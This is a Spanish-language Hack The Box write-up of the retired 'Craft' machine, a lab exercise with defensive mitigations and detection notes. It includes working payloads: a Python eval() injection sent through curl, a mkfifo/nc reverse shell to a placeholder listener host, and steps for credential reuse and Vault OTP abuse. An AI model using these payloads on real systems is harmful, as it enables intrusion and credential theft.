---
machine: Craft
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, flask, eval, gogs, git, docker, vault, ssh-otp]
---

# Craft — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Tres nombres en el mismo nginx: `craft.htb`, `api.craft.htb` (Flask) y `gogs.craft.htb`. El repositorio público `Craft/craft-api` deja en su historial la contraseña de `dinesh` y un `eval()` sobre el campo `abv` de `POST /api/brew/`, que da ejecución de código dentro del contenedor de la API. `settings.py` entrega las credenciales de MySQL en claro, la tabla `user` las contraseñas de los tres usuarios y `gilfoyle` reutiliza la suya en Gogs, donde su repositorio privado `craft-infra` incluye una clave SSH. En el host, el `~/.vault-token` de `gilfoyle` tiene política `root` y el motor SSH de Vault permite pedir un OTP para entrar como `root`.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 22,443,6022 -sCV -oA nmap_svc <IP>
```

```text
22/tcp   open  ssh       OpenSSH 7.4p1 Debian 10+deb9u5
443/tcp  open  ssl/http  nginx 1.15.8
6022/tcp open  ssh       SSH-2.0-Go
```

- El 6022 no es un SSH de sistema: es el servidor Go que Gogs usa para `git` por SSH.
- El certificado del 443 lleva `commonName=craft.htb`, que confirma el vhost previsto.
- No hay puerto 80 accesible y no aparece ningún endpoint PHP.

```bash
printf '%s\n' '<IP> craft.htb api.craft.htb gogs.craft.htb' | sudo tee -a /etc/hosts
```

## Enumeración

La portada enlaza con la API y con Gogs. En Gogs el repositorio `Craft/craft-api` es público, así que el código y todo su historial se leen sin autenticarse:

```bash
GIT_SSL_NO_VERIFY=true git clone https://gogs.craft.htb/Craft/craft-api.git
cd craft-api && git log --oneline
```

En el commit de limpieza de las pruebas aparece una credencial que después se borró:

```bash
git show a2d28ed        # tests/test.py
-    auth=('dinesh', '<PASSWORD>')
+    auth=('', '')
```

- `api.craft.htb/api/` es una API Flask-RESTPlus con `/auth/login`, `/auth/check` y `/brew/`.
- El JWT que alguien pegó en el issue #2 ya está caducado: no sirve como acceso.
- La cuenta `administrator` de Gogs existe, pero ninguna fuente recupera su contraseña.

```bash
curl -sk -u 'dinesh:<PASSWORD>' https://api.craft.htb/api/auth/login
```

La respuesta trae un token que se envía en la cabecera `X-Craft-API-Token`.

## Foothold

El commit que "arregla" los valores de ABV introduces el fallo real:

```python
# craft_api/api/brew/endpoints/brew.py
if eval('%s > 1' % request.json['abv']):
```

`abv` se concatena en una llamada a `eval`, así que el campo acepta código Python. Primero se comprueba con una pausa y luego se cambia por una reverse shell:

```bash
curl -sk -H 'Content-Type: application/json' -H "X-Craft-API-Token: <TOKEN>" \
  https://api.craft.htb/api/brew/ -XPOST \
  -d '{"id":1000,"brewer":"x","name":"x","style":"IPA","abv":"__import__(\"time\").sleep(5)"}'
```

```bash
curl -sk -H 'Content-Type: application/json' -H "X-Craft-API-Token: <TOKEN>" \
  https://api.craft.htb/api/brew/ -XPOST \
  -d '{"id":1000,"brewer":"x","name":"x","style":"IPA","abv":"__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f\") or 1"}'
```

La shell vuelve como `uid=0(root)`, pero existe `/.dockerenv`: es root **del contenedor**, no del host. Ese matiz cambia el resto de la cadena.

## Movimiento lateral

Dentro del contenedor, `settings.py` no está en el repositorio (figura en `.gitignore`) y guarda los secretos de la aplicación:

```text
CRAFT_API_SECRET        = '<SECRETO>'
MYSQL_DATABASE_USER     = 'craft'
MYSQL_DATABASE_PASSWORD = '<PASSWORD>'
MYSQL_DATABASE_HOST     = 'db'
```

El propio repo trae `dbtest.py` con `pymysql`; modificado para `SELECT * FROM user` devuelve las contraseñas en claro de `dinesh`, `ebachman` y `gilfoyle`.

Con `gilfoyle` se entra en Gogs, donde hay un repositorio privado `gilfoyle/craft-infra` con la infraestructura en Docker, la configuración de nginx y Flask, y una clave SSH:

```bash
GIT_SSL_NO_VERIFY=true git clone https://gilfoyle:<PASSWORD>@gogs.craft.htb/gilfoyle/craft-infra.git
ssh -i craft-infra/.ssh/id_rsa gilfoyle@craft.htb    # passphrase: la misma contraseña
```

Del contenedor al host se salta con esa clave, no con un escape de Docker: la contraseña de Gogs y la passphrase de la clave son la misma que la de MySQL.

## Escalada de privilegios

En el home de `gilfoyle` hay un token de Vault con política `root`:

```bash
cat ~/.vault-token          # <TOKEN>
vault login                 # se pega el token
vault write ssh/creds/root_otp ip=127.0.0.1
```

La respuesta trae `username=root`, `port=22` y una `key` de un solo uso. El rol `root_otp` se creó con `key_type=otp` y `default_user=root`, así que esa clave es la contraseña de un login SSH normal:

```bash
ssh root@127.0.0.1          # contraseña = el OTP devuelto
# alternativa en un paso:
vault ssh -mode=otp -role=root_otp root@craft.htb
```

Por qué funciona: el motor SSH de Vault no guarda contraseñas, emite un OTP que valida contra el propio servidor en el momento del login. Con política `root` sobre Vault, el atacante puede pedir credenciales de cualquier rol definido, y aquí había uno para `root`.

## Evidencia

- `nmap` con los tres puertos y el banner `SSH-2.0-Go`.
- `git show a2d28ed` con la credencial ya redactada.
- `id` y `ls -la /.dockerenv` dentro del contenedor.
- Salida de `vault write ssh/creds/root_otp` con la `key` recortada.
- Sin flags, sin contraseñas y sin el token completo.

## Lecciones aprendidas

- La tentación de atribuir el fallo a CVE-2019-11043 es un error: esa CVE afecta a PHP-FPM sobre nginx y aquí la aplicación es Flask. Un `eval` en Python basta y no tiene CVE.
- Un repositorio público con historial es una fuente de credenciales: el `git log` completo es parte de la superficie.
- Ser root en un contenedor no es ser root en el host; hay que buscar secretos de la infraestructura, no un escape.
- Un token de Vault con política `root` equivale a las credenciales de todos los roles del motor SSH.
- Los OTP de Vault caducan y son de un solo uso: sirven para entrar, no para persistence.

## Mitigaciones y detección

- Nunca pasar entrada de usuario a `eval`/`exec`; validar `abv` como decimal y rechazar el resto.
- Sacar los secretos del repositorio y del historial (rotar lo expuesto), y usar un gestor con auditoría en lugar de `settings.py` con contraseñas en claro.
- Guardar hashes con `bcrypt`/`argon2` en la base de datos, no contraseñas legibles.
- Limitar las políticas de Vault: un token de usuario no debe poder emitir credenciales de `root`.
- Detección: `POST /api/brew/` con `abv` no numérico en el access log; procesos `python` que lanzan `nc`/`/bin/sh`; `vault write ssh/creds/*` en los logs de auditoría de Vault; logins SSH con `key_type=otp` para `root` en `auth.log`.

MITRE: T1190 (exploit public-facing application), T1059.006 (Python), T1552.001 (credentials in files), T1552.004 (private keys), T1213.003 (code repositories), T1021.004 (SSH), T1078 (valid accounts).

## Referencias

- <https://snowscan.io/htb-writeup-craft>
- <https://0xrick.github.io/hack-the-box/craft>
- <https://cyllective.com/blog/posts/ctf-hackthebox-craft>
- <https://docs.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords>
- <https://attack.mitre.org/techniques/T1190/>
